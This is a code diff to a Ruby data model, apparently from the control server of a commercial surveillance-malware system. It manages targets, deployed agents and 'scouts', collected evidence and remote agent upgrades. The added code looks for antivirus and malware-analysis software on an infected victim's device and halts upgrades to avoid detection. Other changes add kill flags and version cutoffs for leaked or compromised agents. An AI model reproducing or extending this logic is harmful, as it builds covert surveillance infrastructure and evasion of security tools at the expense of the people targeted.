@@ -42,9 +42,13 @@ class Item
   field :uninstalled, type: Boolean
   field :demo, type: Boolean, default: false
   field :scout, type: Boolean, default: false
-  field :upgradable, type: Boolean
+  field :upgradable, type: Boolean, default: false
   field :purge, type: Array, default: [0, 0]
 
+  # used in case of crisis
+  field :good, type: Boolean, default: true
+
+  # checksum
   field :cs, type: String
   
   scope :operations, where(_kind: 'operation')
@@ -69,6 +73,7 @@ class Item
   index :_kind
   index :ident
   index :instance
+  index :path
 
   store_in :items
 
@@ -110,8 +115,8 @@ class Item
   def restat
     case self._kind
       when 'operation'
-        self.stat.size = 0;
-        self.stat.grid_size = 0;
+        self.stat.size = 0
+        self.stat.grid_size = 0
         targets = Item.where(_kind: 'target').also_in(path: [self._id]).only(:stat)
         targets.each do |t|
           self.stat.size += t.stat.size
@@ -301,18 +306,26 @@ class Item
   end
 
   def upgrade!
-    return if self.version.nil?
+    raise "Cannot determine agent version" if self.version.nil?
 
     # delete any pending upgrade if requested multiple time
     self.upgrade_requests.destroy_all if self.upgradable
 
     if self.scout
+      raise "Compromised scout cannot be ugraded" if self.version <= 3
+      
       # check the presence of blacklisted AV in the device evidence
       blacklisted_software?
 
       # if it's a scout, there a special procedure
       return upgrade_scout
     end
+
+    # in case of elite leak
+    raise "Old agent cannot be ugraded" if self.version < 2013031101
+
+    # in case of "total crisis"
+    raise "Version too old cannot be ugraded" unless self.good
 
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
@@ -386,6 +399,14 @@ class Item
     case self._kind
       when 'target'
         self.create_evidence_collections
+        # also create the relative entity
+        Entity.create! do |entity|
+          entity.type = :target
+          entity.level = :automatic
+          entity.path = self.path + [self._id]
+          entity.name = self.name
+          entity.desc = self.desc
+        end
     end
 
     RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'create'})
@@ -415,6 +436,8 @@ class Item
       when 'operation'
         # destroy all the targets of this operation
         Item.where({_kind: 'target', path: [ self._id ]}).each {|targ| targ.destroy}
+        # destroy the entities related to this operation
+        Entity.where({path: [ self._id ]}).each { |entity| entity.destroy }
       when 'target'
         # destroy all the agents of this target
         # to speed up the process, set the DROPPING flag.
@@ -424,13 +447,19 @@ class Item
           agent.save
           agent.destroy
         end
+        # destroy the entities related to this target
+        Entity.any_in({path: [ self._id ]}).each { |entity| entity.destroy }
         trace :info, "Dropping evidence for target #{self.name}"
+        # drop evidence and aggregates
         self.drop_evidence_collections
+        Aggregate.collection_class(self._id.to_s).collection.drop
       when 'agent'
         # dropping flag is set only by cascading from target
         unless self[:dropping]
           trace :info, "Deleting evidence for agent #{self.name}..."
           Evidence.collection_class(self.path.last).destroy_all(conditions: { aid: self._id.to_s })
+          trace :info, "Deleting aggregates for agent #{self.name}..."
+          Aggregate.collection_class(self.path.last).destroy_all(conditions: { aid: self._id.to_s })
           trace :info, "Deleting evidence for agent #{self.name} done."
         end
       when 'factory'
@@ -466,13 +495,14 @@ class Item
   end
 
   def blacklisted_software?
-    raise "Cannot determine blacklist" if self._kind != 'agent'
+    raise BlacklistError.new("Cannot determine blacklist") if self._kind != 'agent'
 
     device = Evidence.collection_class(self.path.last).where({type: 'device', aid: self._id.to_s}).last
-    raise "Cannot determine installed software" unless device
+    raise BlacklistError.new("Cannot determine installed software") unless device
 
     installed = device[:data]['content']
 
+    # check for installed AV
     File.readlines(RCS::DB::Config.instance.file('blacklist')).each do |offending|
       offending.chomp!
       next unless offending
@@ -481,9 +511,22 @@ class Item
       trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
       if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
         trace :warn, "Blacklisted software detected: #{bmatch}"
-        raise "The target device contains a software that prevents the upgrade."
+        raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
       end
     end
+
+    # check for installed analysis programs
+    File.readlines(RCS::DB::Config.instance.file('blacklist_analysis')).each do |offending|
+      offending = offending.split('#').first
+      offending.strip!
+      offending.chomp!
+      next if offending.length == 0
+      if Regexp.new(offending, Regexp::IGNORECASE).match(installed)
+        trace :warn, "Analysis software detected: #{offending}"
+        raise BlacklistError.new("The target device contains malware analysis software. Please contact HT support immediately")
+      end
+    end
+
   end
 
   def self.offload_destroy(params)
@@ -530,7 +573,7 @@ class Item
     hash = [self._id, self.name, self.counter, self.status, self._kind, self.path]
 
     if self._kind == 'agent'
-      hash << [self.instance, self.type, self.platform, self.deleted, self.uninstalled, self.demo, self.upgradable]
+      hash << [self.instance, self.type, self.platform, self.deleted, self.uninstalled, self.demo, self.upgradable, self.scout, self.good]
     end
 
     aes_encrypt(Digest::SHA1.digest(hash.inspect), Digest::SHA1.digest("∫∑x=1 ∆t")).unpack('H*').first
@@ -614,10 +657,21 @@ class Stat
   field :last_sync_status, type: Integer
   field :last_child, type: Array
   field :size, type: Integer, :default => 0
-  field :ghost, type: Boolean, :default => false
   field :grid_size, type: Integer, :default => 0
   field :evidence, type: Hash, :default => {}
   field :dashboard, type: Hash, :default => {}
   
   embedded_in :item
+end
+
+class BlacklistError < StandardError
+  attr_reader :msg
+
+  def initialize(msg)
+    @msg = msg
+  end
+
+  def to_s
+    @msg
+  end
 end
